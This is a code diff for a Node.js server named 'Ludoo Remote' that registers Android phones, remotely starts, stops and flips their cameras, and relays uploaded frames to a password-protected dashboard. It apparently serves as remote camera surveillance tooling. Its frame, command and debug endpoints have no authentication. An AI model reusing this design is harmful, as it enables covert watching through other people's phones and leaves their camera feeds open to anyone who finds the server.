@@ -32,50 +32,21 @@ function requireAuth(req, res, next) {
     res.redirect('/login');
 }
 
+// ========== STATE ==========
 let devices = [];
 let deviceHeartbeats = {};
-let deviceSockets = {};       // deviceId -> socket.id (WebSocket registered devices)
-let pendingCommands = {};     // HTTP fallback queue
+let pendingCommands = {};
 let latestFrames = {};
-let globalSettings = { stream: false, quality: 240, fps: 15 };
-let deviceSettings = {};      // per-device settings: deviceId -> { stream, quality, fps }
+let deviceSettings = {};
+let activeStreams = {}; // deviceId -> socket.id
 
 function getDeviceSettings(deviceId) {
-    if (!deviceSettings[deviceId]) deviceSettings[deviceId] = { stream: false, quality: 240, fps: 15 };
+    if (!deviceSettings[deviceId]) {
+        deviceSettings[deviceId] = { stream: false, quality: 240, fps: 15, camera: 'back' };
+    }
     return deviceSettings[deviceId];
 }
 
-// Fuzzy-resolve deviceSettings: handles heartbeat ID vs WS ID mismatch
-// e.g. OPPO_CPH2061_1781183457271 (heartbeat) vs OPPO_CPH2061_1781183456003 (WS)
-function resolveDeviceSettings(deviceId) {
-    if (deviceSettings[deviceId]) return deviceSettings[deviceId];
-    let bestId = null, bestLen = 0;
-    for (const knownId of Object.keys(deviceSettings)) {
-        let common = 0;
-        while (common < knownId.length && common < deviceId.length && knownId[common] === deviceId[common]) common++;
-        if (common > bestLen && common >= Math.min(8, knownId.length, deviceId.length)) {
-            bestId = knownId; bestLen = common;
-        }
-    }
-    return bestId ? deviceSettings[bestId] : getDeviceSettings(deviceId);
-}
-
-// Fuzzy-resolve latestFrames lookup
-function resolveLatestFrame(deviceId) {
-    if (latestFrames[deviceId]) return latestFrames[deviceId];
-    let bestFrame = null, bestLen = 0;
-    for (const knownId of Object.keys(latestFrames)) {
-        let common = 0;
-        while (common < knownId.length && common < deviceId.length && knownId[common] === deviceId[common]) common++;
-        if (common > bestLen && common >= Math.min(8, knownId.length, deviceId.length)) {
-            bestFrame = latestFrames[knownId]; bestLen = common;
-        }
-    }
-    return bestFrame || null;
-}
-
-// Find the canonical device entry by fuzzy ID match against the devices[] list.
-// Used to merge WS registrations into the same device as the heartbeat entry.
 function findCanonicalDevice(deviceId) {
     if (!deviceId) return null;
     const exact = devices.find(d => d.id === deviceId);
@@ -91,45 +62,31 @@ function findCanonicalDevice(deviceId) {
     return best;
 }
 
-// Find the best-matching socket for a given targetId.
-// Handles ID mismatch where heartbeat and WS use slightly different IDs
-// (e.g. OPPO_CPH2061_111 vs OPPO_CPH2061_222 — same base, different timestamp suffix).
-function findSocketForDevice(targetId) {
-    if (!targetId) return null;
-    // 1. Exact match
-    if (deviceSockets[targetId]) {
-        const s = io.sockets.sockets.get(deviceSockets[targetId]);
-        if (s) return s;
-    }
-    // 2. Fuzzy: find WS key that shares the longest common prefix with targetId
-    let bestSocket = null, bestLen = 0;
-    for (const [wsId, sockId] of Object.entries(deviceSockets)) {
+function resolveLatestFrame(deviceId) {
+    if (latestFrames[deviceId]) return latestFrames[deviceId];
+    let bestFrame = null, bestLen = 0;
+    for (const knownId of Object.keys(latestFrames)) {
         let common = 0;
-        while (common < wsId.length && common < targetId.length && wsId[common] === targetId[common]) common++;
-        if (common > bestLen && common >= Math.min(8, wsId.length, targetId.length)) {
-            const s = io.sockets.sockets.get(sockId);
-            if (s) { bestSocket = s; bestLen = common; }
+        while (common < knownId.length && common < deviceId.length && knownId[common] === deviceId[common]) common++;
+        if (common > bestLen && common >= Math.min(8, knownId.length, deviceId.length)) {
+            bestFrame = latestFrames[knownId]; bestLen = common;
         }
     }
-    return bestSocket;
+    return bestFrame || null;
 }
 
-// Cleanup stale devices every 60s.
-// A device is stale if its WebSocket is gone AND lastSeen > 5 minutes ago.
-// This handles WS-only mode (no HTTP heartbeat) with a generous grace window.
+// Cleanup stale devices every 60s
 setInterval(() => {
     const now = Date.now();
     devices = devices.filter(device => {
-        const hasSocket = !!deviceSockets[device.id];
-        const lastSeen = device.lastSeen || 0;
-        const stale = !hasSocket && (now - lastSeen) > 300000; // 5 minutes grace
+        const stale = (now - (device.lastSeen || 0)) > 300000;
         if (stale) {
-            console.log(`🧹 Removing stale device: ${device.id}`);
+            console.log(`🗑️ Removing stale device: ${device.id}`);
             delete deviceHeartbeats[device.id];
-            delete deviceSockets[device.id];
             delete pendingCommands[device.id];
             delete latestFrames[device.id];
             delete deviceSettings[device.id];
+            delete activeStreams[device.id];
             return false;
         }
         return true;
@@ -138,22 +95,52 @@ setInterval(() => {
 
 // ========== HTTP API ==========
 
+// REGISTER DEVICE
+app.post('/api/register', (req, res) => {
+    try {
+        const { deviceId, deviceName } = req.body;
+        console.log(`📱 Device registered: ${deviceId} (${deviceName})`);
+        let device = devices.find(d => d.id === deviceId);
+        if (!device) {
+            device = {
+                id: deviceId,
+                name: deviceName || 'Android Device',
+                connectedAt: new Date().toLocaleTimeString(),
+                firstSeen: Date.now()
+            };
+            devices.push(device);
+        }
+        res.json({ success: true });
+    } catch (e) {
+        res.status(500).json({ success: false, error: e.message });
+    }
+});
+
+// HEARTBEAT
 app.post('/api/heartbeat', (req, res) => {
     try {
-        const { deviceId, deviceName, camera, cameraReady, streaming, cameraPermission, batteryOptimization, batteryPercentage } = req.body;
+        const {
+            deviceId, deviceName, camera, cameraReady, streaming,
+            cameraPermission, batteryOptimization, batteryPercentage
+        } = req.body;
+
         deviceHeartbeats[deviceId] = Date.now();
         let device = devices.find(d => d.id === deviceId);
         if (!device) {
-            device = { id: deviceId, name: deviceName || 'Android Device', connectedAt: new Date().toLocaleTimeString(), firstSeen: Date.now() };
+            device = {
+                id: deviceId,
+                name: deviceName || 'Android Device',
+                connectedAt: new Date().toLocaleTimeString(),
+                firstSeen: Date.now()
+            };
             devices.push(device);
-            console.log(`✅ Device registered: ${device.name} (${deviceId})`);
         }
         device.name = deviceName || device.name;
         device.camera = camera || device.camera;
-        device.cameraReady = cameraReady;
-        device.streaming = streaming;
-        device.cameraPermission = cameraPermission;
-        device.batteryOptimization = batteryOptimization;
+        device.cameraReady = cameraReady || false;
+        device.streaming = streaming || false;
+        device.cameraPermission = cameraPermission || false;
+        device.batteryOptimization = batteryOptimization || false;
         device.batteryPercentage = batteryPercentage || 0;
         device.lastHeartbeat = new Date().toLocaleTimeString();
         device.lastSeen = Date.now();
@@ -163,13 +150,32 @@ app.post('/api/heartbeat', (req, res) => {
     }
 });
 
+// FRAME UPLOAD (HTTP fallback)
 app.post('/api/frame', (req, res) => {
     try {
         const { deviceId, image, quality, fps, camera } = req.body;
-        if (deviceId && image && resolveDeviceSettings(deviceId).stream) {
-            const frameData = { image, ts: Date.now(), quality, fps, camera };
+        if (deviceId && image) {
+            const ds = getDeviceSettings(deviceId);
+            const frameData = {
+                image,
+                ts: Date.now(),
+                quality: quality || ds.quality || 240,
+                fps: fps || ds.fps || 15,
+                camera: camera || ds.camera || 'back'
+            };
             latestFrames[deviceId] = frameData;
-            io.emit('frame', { deviceId, image, timestamp: frameData.ts, camera, quality, fps });
+            
+            // Broadcast via WebSocket if active
+            if (activeStreams[deviceId]) {
+                io.to(activeStreams[deviceId]).emit('frame', {
+                    deviceId,
+                    image,
+                    timestamp: frameData.ts
+                });
+            }
+            
+            const dev = devices.find(d => d.id === deviceId);
+            if (dev) dev.lastSeen = Date.now();
         }
         res.json({ success: true });
     } catch (e) {
@@ -177,40 +183,45 @@ app.post('/api/frame', (req, res) => {
     }
 });
 
+// FRAME FETCH
 app.get('/api/frame/:deviceId', (req, res) => {
     const frame = resolveLatestFrame(req.params.deviceId);
     if (!frame) return res.json({ success: false, image: null });
     res.json({ success: true, image: frame.image, ts: frame.ts });
 });
 
-// HTTP command send (web UI fallback if WebSocket not available)
+// COMMAND SEND (HTTP Only)
 app.post('/api/command', (req, res) => {
     try {
         const { deviceId, command, value } = req.body;
+        console.log(`📨 HTTP Command: [${command}] for [${deviceId}]`);
 
         const ds = getDeviceSettings(deviceId);
         switch (command) {
-            case 'start': ds.stream = true; break;
-            case 'stop':  ds.stream = false; break;
-            case 'quality': ds.quality = value; break;
-            case 'fps':   ds.fps = value; break;
+            case 'start':
+                ds.stream = true;
+                break;
+            case 'stop':
+                ds.stream = false;
+                break;
+            case 'flip':
+                ds.camera = ds.camera === 'back' ? 'front' : 'back';
+                break;
+            case 'quality':
+                ds.quality = value;
+                break;
+            case 'fps':
+                ds.fps = value;
+                break;
         }
 
         const cmd = { command, value: value ?? null };
 
-        // Send only to the targeted device via WS (fuzzy match handles ID mismatch)
-        const targetSock = findSocketForDevice(deviceId);
-        if (targetSock) {
-            targetSock.emit('command', cmd);
-            console.log(`📡 HTTP Command [${command}] → WS device [${deviceId}] ✓`);
-        } else {
-            console.log(`📡 HTTP Command [${command}] → no WS for [${deviceId}], HTTP queue only`);
-        }
-
-        // Queue HTTP fallback only for the target device
+        // Queue for HTTP polling
         if (deviceId) {
             if (!pendingCommands[deviceId]) pendingCommands[deviceId] = [];
             pendingCommands[deviceId].push(cmd);
+            console.log(`📦 Command queued for HTTP poll: ${command}`);
         }
 
         res.json({ success: true, settings: getDeviceSettings(deviceId) });
@@ -219,127 +230,126 @@ app.post('/api/command', (req, res) => {
     }
 });
 
-// HTTP command poll (Android fallback)
+// COMMAND POLL (Android - HTTP Only)
 app.get('/api/commands/:deviceId', (req, res) => {
     try {
         const { deviceId } = req.params;
         deviceHeartbeats[deviceId] = Date.now();
-        // Fuzzy-check before auto-registering to avoid duplicate entries
+
         if (!findCanonicalDevice(deviceId)) {
-            devices.push({ id: deviceId, name: deviceId, connectedAt: new Date().toLocaleTimeString(), firstSeen: Date.now(), lastHeartbeat: new Date().toLocaleTimeString() });
-            console.log(`📱 Auto-registered: ${deviceId}`);
+            devices.push({
+                id: deviceId,
+                name: deviceId,
+                connectedAt: new Date().toLocaleTimeString(),
+                firstSeen: Date.now(),
+                lastSeen: Date.now()
+            });
         }
-        // Collect commands: check exact key AND any fuzzy-matched key (heartbeat vs WS ID mismatch)
+
         let cmds = [];
-        const allKeys = Object.keys(pendingCommands);
-        for (const key of allKeys) {
-            if (pendingCommands[key].length === 0) continue;
-            // Exact match OR fuzzy prefix match
-            let common = 0;
-            while (common < key.length && common < deviceId.length && key[common] === deviceId[common]) common++;
-            if (key === deviceId || common >= Math.min(8, key.length, deviceId.length)) {
-                cmds = cmds.concat(pendingCommands[key]);
-                pendingCommands[key] = [];
-            }
+        if (pendingCommands[deviceId] && pendingCommands[deviceId].length > 0) {
+            cmds = pendingCommands[deviceId].map(c => c.command);
+            pendingCommands[deviceId] = [];
         }
-        if (cmds.length > 0) console.log(`✅ HTTP delivered ${cmds.length} cmd(s) to [${deviceId}]`);
-        res.json({ success: true, settings: getDeviceSettings(deviceId), commands: cmds });
+
+        if (cmds.length > 0) {
+            console.log(`✅ HTTP Poll delivered ${cmds.length} commands to ${deviceId}`);
+        }
+
+        res.json({
+            success: true,
+            settings: getDeviceSettings(deviceId),
+            commands: cmds
+        });
     } catch (e) {
         res.status(500).json({ success: false, error: e.message });
     }
 });
 
-app.post('/api/device-status', (req, res) => {
-    try {
-        const { deviceId, cameraReady, streaming, cameraType, cameraPermission, status } = req.body;
-        let device = devices.find(d => d.id === deviceId);
-        if (device) {
-            if (cameraReady !== undefined) device.cameraReady = cameraReady;
-            if (streaming !== undefined) device.streaming = streaming;
-            if (cameraType) device.camera = cameraType;
-            if (cameraPermission !== undefined) device.cameraPermission = cameraPermission;
-            device.status = status;
-            device.lastUpdate = new Date().toLocaleTimeString();
-        }
-        res.json({ success: true });
-    } catch (e) {
-        res.status(500).json({ success: false, error: e.message });
-    }
-});
-
+// DEVICES LIST
 app.get('/api/devices', (req, res) => {
     const now = Date.now();
-    res.json({ success: true, devices: devices.map(d => ({
-        id: d.id, name: d.name, camera: d.camera || 'back',
-        cameraReady: d.cameraReady || false, streaming: d.streaming || false,
-        cameraPermission: d.cameraPermission || false,
-        batteryOptimization: d.batteryOptimization || false,
-        batteryPercentage: d.batteryPercentage || 0,
-        isConnected: !!deviceSockets[d.id] || (Date.now() - (d.lastSeen || 0)) < 30000,
-        hasWebSocket: !!deviceSockets[d.id],
-        lastHeartbeat: d.lastHeartbeat, connectedAt: d.connectedAt
-    }))});
+    res.json({
+        success: true,
+        devices: devices.map(d => ({
+            id: d.id,
+            name: d.name,
+            camera: d.camera || 'back',
+            cameraReady: d.cameraReady || false,
+            streaming: d.streaming || false,
+            cameraPermission: d.cameraPermission || false,
+            batteryOptimization: d.batteryOptimization || false,
+            batteryPercentage: d.batteryPercentage || 0,
+            isConnected: (now - (d.lastSeen || 0)) < 30000,
+            hasWebSocket: !!activeStreams[d.id],
+            lastHeartbeat: d.lastHeartbeat,
+            connectedAt: d.connectedAt,
+            settings: getDeviceSettings(d.id)
+        }))
+    });
 });
 
+// DEVICE DETAIL
 app.get('/api/device/:deviceId', (req, res) => {
     const device = devices.find(d => d.id === req.params.deviceId);
     if (!device) return res.status(404).json({ success: false, error: 'Not found' });
     const now = Date.now();
-    res.json({ success: true, device: { ...device, isConnected: !!deviceSockets[device.id] || (Date.now() - (device.lastSeen || 0)) < 30000, hasWebSocket: !!deviceSockets[device.id] } });
+    res.json({
+        success: true,
+        device: {
+            ...device,
+            isConnected: (now - (device.lastSeen || 0)) < 30000,
+            hasWebSocket: !!activeStreams[device.id],
+            settings: getDeviceSettings(device.id)
+        }
+    });
 });
 
-app.get('/api/settings', (req, res) => res.json({ success: true, settings: globalSettings }));
+// HEALTH
+app.get('/api/health', (req, res) => res.json({
+    status: 'ok',
+    devices: devices.length,
+    uptime: process.uptime(),
+    frames: Object.keys(latestFrames).length,
+    commands: Object.keys(pendingCommands).reduce((acc, key) => acc + pendingCommands[key].length, 0)
+}));
 
-app.get('/api/health', (req, res) => res.json({ status: 'ok', devices: devices.length, streaming: globalSettings.stream, uptime: process.uptime() }));
-
+// DEBUG
 app.get('/api/debug', (req, res) => {
     res.json({
         devices: devices.map(d => d.id),
-        deviceSockets,
+        activeStreams,
         pendingCommands,
-        globalSettings,
-        heartbeats: Object.fromEntries(Object.entries(deviceHeartbeats).map(([k, v]) => [k, `${Math.round((Date.now() - v) / 1000)}s ago`]))
+        heartbeats: Object.fromEntries(
+            Object.entries(deviceHeartbeats).map(([k, v]) => [k, `${Math.round((Date.now() - v) / 1000)}s ago`])
+        )
     });
 });
 
 app.get('/favicon.ico', (req, res) => res.status(204).end());
 
-// ========== WEBSOCKET ==========
-
-// Push a single device's latest status to all web dashboard clients instantly
-function broadcastDeviceUpdate(device) {
-    io.emit('device_update', {
-        id: device.id,
-        name: device.name,
-        cameraReady: device.cameraReady || false,
-        streaming: device.streaming || false,
-        cameraPermission: device.cameraPermission || false,
-        batteryOptimization: device.batteryOptimization || false,
-        batteryPercentage: device.batteryPercentage || 0,
-        isConnected: true,
-        hasWebSocket: true,
-        lastHeartbeat: device.lastHeartbeat,
-        connectedAt: device.connectedAt
-    });
-}
+// ========== WEBSOCKET (Only for Stream) ==========
 
 io.on('connection', (socket) => {
     console.log(`🔌 WS connected: ${socket.id}`);
 
-    // Android device registers for WebSocket commands
+    // Android registers for WebSocket streaming
     socket.on('register_stream', (data) => {
         const { deviceId, deviceName, cameraReady, cameraPermission, batteryOptimization } = data;
-        // Fuzzy-match to existing device so both HTTP and WS map to ONE entry
+
         const canonical = findCanonicalDevice(deviceId);
         const canonicalId = canonical ? canonical.id : deviceId;
 
-        // Create device entry if it doesn't exist yet (WS-only, no HTTP heartbeat)
         let device = devices.find(d => d.id === canonicalId);
         if (!device) {
-            device = { id: canonicalId, name: deviceName || 'Android Device', connectedAt: new Date().toLocaleTimeString(), firstSeen: Date.now() };
+            device = {
+                id: canonicalId,
+                name: deviceName || 'Android Device',
+                connectedAt: new Date().toLocaleTimeString(),
+                firstSeen: Date.now()
+            };
             devices.push(device);
         }
-        // Store all registration fields
         if (deviceName) device.name = deviceName;
         if (cameraReady !== undefined) device.cameraReady = cameraReady;
         if (cameraPermission !== undefined) device.cameraPermission = cameraPermission;
@@ -347,21 +357,20 @@ io.on('connection', (socket) => {
         device.lastHeartbeat = new Date().toLocaleTimeString();
         device.lastSeen = Date.now();
 
-        deviceSockets[canonicalId] = socket.id;
         socket.deviceId = canonicalId;
-        socket.join('devices');
-        console.log(`📡 Device [${canonicalId}] registered on WebSocket`);
+        socket.join('streamers');
+
+        console.log(`📡 Device [${canonicalId}] registered for WebSocket stream`);
         socket.emit('settings', getDeviceSettings(canonicalId));
-        // Immediately push updated status to all web dashboard clients
-        broadcastDeviceUpdate(device);
     });
 
-    // APK sends this any time a permission/battery status changes at runtime
+    // Status update from Android
     socket.on('device_status_update', (data) => {
         const canonicalId = socket.deviceId;
         if (!canonicalId) return;
         const device = devices.find(d => d.id === canonicalId);
         if (!device) return;
+
         const { cameraReady, cameraPermission, batteryOptimization, batteryPercentage, streaming } = data;
         if (cameraReady !== undefined) device.cameraReady = cameraReady;
         if (cameraPermission !== undefined) device.cameraPermission = cameraPermission;
@@ -369,66 +378,70 @@ io.on('connection', (socket) => {
         if (batteryPercentage !== undefined) device.batteryPercentage = batteryPercentage;
         if (streaming !== undefined) device.streaming = streaming;
         device.lastSeen = Date.now();
+
         console.log(`🔄 Status update [${canonicalId}]: cam=${cameraPermission} batt=${batteryOptimization}`);
-        broadcastDeviceUpdate(device);
     });
 
-    // Android sends frame via WebSocket
+    // Frame via WebSocket (Android sends)
     socket.on('stream_frame', (data) => {
         const { deviceId, image, timestamp, quality, fps, camera } = data;
         const canonicalId = socket.deviceId || deviceId;
-        // Keep device alive — update lastSeen on every frame
+
         const dev = devices.find(d => d.id === canonicalId);
         if (dev) dev.lastSeen = Date.now();
-        if (canonicalId && image && resolveDeviceSettings(canonicalId).stream) {
-            const frameData = { image, ts: timestamp || Date.now(), quality, fps, camera };
+
+        if (canonicalId && image) {
+            const ds = getDeviceSettings(canonicalId);
+            const frameData = {
+                image,
+                ts: timestamp || Date.now(),
+                quality: quality || ds.quality || 240,
+                fps: fps || ds.fps || 15,
+                camera: camera || ds.camera || 'back'
+            };
             latestFrames[canonicalId] = frameData;
-            socket.broadcast.emit('frame', { deviceId: canonicalId, image, timestamp, camera, quality, fps });
+
+            // Add to active stream
+            activeStreams[canonicalId] = socket.id;
+
+            // Broadcast to dashboard
+            socket.broadcast.emit('frame', {
+                deviceId: canonicalId,
+                image,
+                timestamp: frameData.ts
+            });
         }
     });
 
-    // Web UI sends command via WebSocket → send to selected device only
-    socket.on('send_command', (data) => {
-        const { deviceId, command, value } = data;
-
-        const ds = getDeviceSettings(deviceId);
-        switch (command) {
-            case 'start': ds.stream = true; break;
-            case 'stop':  ds.stream = false; break;
-            case 'quality': ds.quality = value; break;
-            case 'fps':   ds.fps = value; break;
-        }
-
-        const cmd = { command, value: value ?? null };
-
-        // Send only to the selected device (fuzzy match handles ID mismatch)
-        const targetSock = findSocketForDevice(deviceId);
-        if (targetSock) {
-            targetSock.emit('command', cmd);
-            console.log(`⚡ WS Command [${command}] → device [${deviceId}] ✓`);
-        } else {
-            console.log(`⚡ WS Command [${command}] → no WS for [${deviceId}], HTTP queue only`);
-        }
-
-        // Queue HTTP fallback only for this device
+    // Dashboard subscribes to a device stream
+    socket.on('subscribe_stream', (data) => {
+        const { deviceId } = data;
         if (deviceId) {
-            if (!pendingCommands[deviceId]) pendingCommands[deviceId] = [];
-            pendingCommands[deviceId].push(cmd);
+            socket.join(`stream_${deviceId}`);
+            console.log(`📺 Dashboard subscribed to ${deviceId}`);
+            
+            // Send latest frame if available
+            const frame = resolveLatestFrame(deviceId);
+            if (frame) {
+                socket.emit('frame', {
+                    deviceId,
+                    image: frame.image,
+                    timestamp: frame.ts
+                });
+            }
         }
     });
 
     socket.on('disconnect', () => {
         if (socket.deviceId) {
-            // Delay removal by 8s to absorb brief reconnects (network hiccup, app background)
             const disconnectedId = socket.deviceId;
             setTimeout(() => {
-                // Only delete if no new socket has registered for this device
-                if (deviceSockets[disconnectedId] === socket.id) {
-                    delete deviceSockets[disconnectedId];
-                    console.log(`📴 Device [${disconnectedId}] WS gone after grace period`);
+                if (activeStreams[disconnectedId] === socket.id) {
+                    delete activeStreams[disconnectedId];
+                    console.log(`📴 Device [${disconnectedId}] WS stream ended`);
                 }
             }, 8000);
-            console.log(`⚠️  Device [${disconnectedId}] WS drop — waiting 8s for reconnect`);
+            console.log(`⚠️ Device [${disconnectedId}] WS drop — waiting 8s`);
         } else {
             console.log(`🔌 WS client disconnected: ${socket.id}`);
         }
@@ -449,7 +462,7 @@ app.get('/login', (req, res) => {
 *{margin:0;padding:0;box-sizing:border-box;}
 body{background:#0a0a0a;min-height:100vh;display:flex;align-items:center;justify-content:center;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;}
 .card{background:#1a1a1a;border-radius:20px;padding:36px 28px;width:90%;max-width:360px;border:1px solid #2a2a2a;text-align:center;}
-h1{font-size:28px;margin-bottom:4px;}
+h1{font-size:28px;margin-bottom:4px;color:#fff;}
 .sub{color:#666;font-size:13px;margin-bottom:28px;}
 input{width:100%;padding:14px 16px;background:#0a0a0a;border:1px solid #333;border-radius:12px;color:#fff;font-size:15px;margin-bottom:16px;outline:none;transition:border .2s;letter-spacing:2px;}
 input:focus{border-color:#667eea;}
@@ -460,7 +473,7 @@ button:hover{opacity:.88;}
 </head>
 <body>
 <div class="card">
-  <div class="lock">🔐</div>
+  <div class="lock">🔒</div>
   <h1>Ludoo Remote</h1>
   <p class="sub">Enter password to access dashboard</p>
   <form method="POST" action="/login">
@@ -475,7 +488,7 @@ button:hover{opacity:.88;}
 
 app.post('/login', (req, res) => {
     if (req.body.password === DASHBOARD_PASSWORD) {
-        const maxAge = 7 * 24 * 60 * 60; // 7 days
+        const maxAge = 7 * 24 * 60 * 60;
         res.setHeader('Set-Cookie', `lsess=${VALID_TOKEN}; HttpOnly; SameSite=Strict; Max-Age=${maxAge}; Path=/`);
         return res.redirect('/');
     }
@@ -487,7 +500,7 @@ app.get('/logout', (req, res) => {
     res.redirect('/login');
 });
 
-// ========== WEB INTERFACE ==========
+// ========== DASHBOARD ==========
 app.get('/', requireAuth, (req, res) => {
     res.send(`<!DOCTYPE html>
 <html>
@@ -498,451 +511,367 @@ app.get('/', requireAuth, (req, res) => {
     <style>
         * { margin:0; padding:0; box-sizing:border-box; }
         body { font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif; background:#0a0a0a; min-height:100vh; padding:20px; color:#fff; }
-        .container { max-width:600px; margin:0 auto; }
-        .header { text-align:center; margin-bottom:20px; }
-        .header h1 { font-size:24px; background:linear-gradient(135deg,#667eea,#764ba2); -webkit-background-clip:text; -webkit-text-fill-color:transparent; }
-        .header p { font-size:12px; color:#666; margin-top:5px; }
-        .stats { display:grid; grid-template-columns:repeat(3,1fr); gap:12px; margin-bottom:20px; }
-        .stat-card { background:#1a1a1a; border-radius:12px; padding:12px; text-align:center; border:1px solid #2a2a2a; }
-        .stat-label { font-size:11px; color:#888; margin-bottom:5px; }
-        .stat-value { font-size:20px; font-weight:700; }
+        .container { max-width:700px; margin:0 auto; }
+        .header { display:flex; justify-content:space-between; align-items:center; margin-bottom:20px; }
+        .header h1 { font-size:22px; background:linear-gradient(135deg,#667eea,#764ba2); -webkit-background-clip:text; -webkit-text-fill-color:transparent; }
+        .logout-btn { background:rgba(255,255,255,0.08); border:1px solid #333; color:#888; padding:6px 14px; border-radius:20px; font-size:12px; cursor:pointer; text-decoration:none; transition:all .2s; }
+        .logout-btn:hover { background:rgba(244,67,54,0.2); border-color:#f44336; color:#ff6b6b; }
+
+        .device-selector { display:flex; gap:8px; overflow-x:auto; padding-bottom:12px; margin-bottom:16px; scrollbar-width:none; }
+        .device-selector::-webkit-scrollbar { display:none; }
+        .device-btn { background:#1a1a1a; border:2px solid #2a2a2a; padding:8px 16px; border-radius:20px; color:#888; font-size:12px; cursor:pointer; white-space:nowrap; transition:all .2s; }
+        .device-btn.active { border-color:#667eea; color:#fff; background:rgba(102,126,234,0.15); }
+        .device-btn.online { border-color:#4CAF50; }
+        .device-btn.offline { border-color:#f44336; opacity:0.5; }
+        .device-btn .status-dot { display:inline-block; width:6px; height:6px; border-radius:50%; margin-right:6px; }
+        .device-btn.online .status-dot { background:#4CAF50; }
+        .device-btn.offline .status-dot { background:#f44336; }
+
+        .stats { display:grid; grid-template-columns:repeat(4,1fr); gap:10px; margin-bottom:16px; }
+        .stat-card { background:#1a1a1a; border-radius:12px; padding:10px; text-align:center; border:1px solid #2a2a2a; }
+        .stat-label { font-size:10px; color:#888; margin-bottom:3px; text-transform:uppercase; letter-spacing:0.5px; }
+        .stat-value { font-size:16px; font-weight:700; }
         .stat-value.online { color:#4CAF50; }
-        .ws-badge { display:inline-block; font-size:10px; padding:2px 7px; border-radius:20px; background:#1e3a1e; color:#4CAF50; border:1px solid #2d5a2d; margin-left:6px; vertical-align:middle; }
-        .ws-badge.off { background:#3a1e1e; color:#f44336; border-color:#5a2d2d; }
-        .video-container { background:#000; border-radius:16px; overflow:hidden; aspect-ratio:16/9; margin-bottom:20px; border:1px solid #2a2a2a; display:flex; align-items:center; justify-content:center; position:relative; }
+        .stat-value.offline { color:#f44336; }
+        .stat-value.streaming { color:#4CAF50; }
+        .stat-value.stopped { color:#ff9800; }
+
+        .video-container { background:#000; border-radius:16px; overflow:hidden; aspect-ratio:16/9; margin-bottom:16px; border:1px solid #2a2a2a; display:flex; align-items:center; justify-content:center; position:relative; }
         #video { width:100%; height:100%; object-fit:cover; display:none; }
-        .video-placeholder { text-align:center; color:#555; }
-        .video-placeholder span { font-size:48px; }
-        .disconnected-overlay { display:none; position:absolute; top:0; left:0; right:0; bottom:0; background:rgba(0,0,0,.55); align-items:center; justify-content:center; flex-direction:column; gap:8px; z-index:5; pointer-events:none; }
-        .disconnected-overlay.show { display:flex; }
-        .disconnected-overlay span { font-size:13px; color:#f44336; font-weight:600; letter-spacing:1px; }
-        .expand-btn { position:absolute; bottom:12px; right:12px; background:rgba(0,0,0,.6); border:none; color:white; font-size:18px; width:36px; height:36px; border-radius:50%; cursor:pointer; z-index:10; transition:all .2s; display:flex; align-items:center; justify-content:center; }
-        .expand-btn:hover { background:rgba(102,126,234,.8); transform:scale(1.05); }
-        .video-overlay { display:none; position:fixed; top:0; left:0; right:0; bottom:0; background:rgba(0,0,0,.92); z-index:2000; align-items:center; justify-content:center; }
-        .video-overlay.active { display:flex; }
-        .overlay-video-wrap { position:relative; overflow:hidden; border-radius:12px; touch-action:none; user-select:none; min-width:120px; min-height:80px; }
-        #overlayVideo { display:block; width:100%; height:100%; object-fit:contain; transform-origin:center center; pointer-events:none; }
-        .overlay-corner-btn { position:absolute; top:10px; z-index:10; background:rgba(0,0,0,.65); border:1px solid rgba(255,255,255,.18); color:#fff; font-size:13px; padding:7px 13px; border-radius:20px; cursor:pointer; backdrop-filter:blur(4px); transition:all .2s; display:flex; align-items:center; gap:5px; white-space:nowrap; }
-        .overlay-corner-btn:hover { background:rgba(102,126,234,.85); border-color:#667eea; }
-        .overlay-corner-btn.rotate-btn { left:10px; }
-        .overlay-corner-btn.close-btn { right:10px; border-color:rgba(244,67,54,.5); color:#ff6b6b; }
-        .overlay-corner-btn.close-btn:hover { background:rgba(244,67,54,.85); color:#fff; border-color:#f44336; }
-        .overlay-resize-handle { position:absolute; bottom:0; right:0; width:28px; height:28px; cursor:nwse-resize; z-index:11; display:flex; align-items:flex-end; justify-content:flex-end; padding:4px; }
-        .overlay-resize-handle::after { content:''; display:block; width:14px; height:14px; border-right:3px solid rgba(255,255,255,.45); border-bottom:3px solid rgba(255,255,255,.45); border-radius:2px; }
-        .controls { background:#1a1a1a; border-radius:16px; padding:16px; margin-bottom:20px; border:1px solid #2a2a2a; }
-        .section-title { font-size:12px; color:#888; margin-bottom:12px; letter-spacing:1px; }
-        .button-group { display:flex; gap:12px; margin-bottom:20px; flex-wrap:wrap; }
-        .btn { padding:12px 20px; border:none; border-radius:12px; font-size:14px; font-weight:600; cursor:pointer; transition:all .2s; }
-        .btn-start { background:#4CAF50; color:white; } .btn-start:hover { background:#45a049; }
-        .btn-stop { background:#f44336; color:white; } .btn-stop:hover { background:#da190b; }
-        .btn-flip { background:#2196F3; color:white; } .btn-flip:hover { background:#0b7dda; }
-        .quality-grid { display:grid; grid-template-columns:repeat(4,1fr); gap:8px; margin-bottom:20px; }
-        .quality-btn { padding:10px; border:1px solid #2a2a2a; background:#0a0a0a; color:#fff; border-radius:10px; cursor:pointer; font-size:12px; text-align:center; }
-        .quality-btn.active { background:#667eea; border-color:#667eea; }
-        .fps-control { margin-top:16px; }
-        .fps-slider { width:100%; height:4px; -webkit-appearance:none; background:#2a2a2a; border-radius:2px; margin:10px 0; }
-        .fps-slider::-webkit-slider-thumb { -webkit-appearance:none; width:16px; height:16px; background:#667eea; border-radius:50%; cursor:pointer; }
-        .fps-value { text-align:center; font-size:12px; color:#888; }
-        .devices { background:#1a1a1a; border-radius:16px; padding:16px; border:1px solid #2a2a2a; }
-        .device-item { display:flex; justify-content:space-between; align-items:center; padding:12px 10px; cursor:pointer; transition:background .2s; border-radius:8px; margin:2px 0; }
-        .device-item:hover { background:#252525; }
-        .device-item.selected { background:#1e1e3a; border:1px solid #667eea; }
-        .device-name { font-size:14px; font-weight:500; }
-        .device-status-dot { width:10px; height:10px; border-radius:50%; margin-left:10px; }
-        .status-connected { background:#4CAF50; box-shadow:0 0 5px #4CAF50; }
-        .empty-devices { text-align:center; color:#555; padding:20px; }
-        .status-modal { display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,.85); z-index:1000; justify-content:center; align-items:center; }
-        .status-modal-content { background:#1a1a1a; border-radius:20px; width:90%; max-width:350px; padding:20px; border:1px solid #667eea; }
